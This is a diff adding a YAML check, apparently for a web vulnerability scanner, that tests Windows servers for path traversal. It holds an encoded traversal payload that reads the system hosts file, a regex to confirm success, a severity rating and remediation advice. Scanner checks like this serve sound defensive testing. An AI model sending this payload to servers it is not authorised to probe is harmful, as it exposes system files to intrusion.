@@ -1,0 +1,15 @@
+id: "PATH-TRAVERSAL-WINDOWS-HOSTS"
+name: "Path traversal exposure (Windows hosts)"
+tech_stack: []
+severity: high
+cvss: 7.5
+payload: "/..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
+request_method: GET
+verify:
+  match_type: BodyRegex
+  response_codes: [200]
+  body_regex: "(?i)(localhost|#.*copyright.*microsoft)"
+cve_id: null
+remediation: "Canonicalize requested paths and restrict file access to an allowlisted base directory."
+references:
+  - "https://owasp.org/www-community/attacks/Path_Traversal"
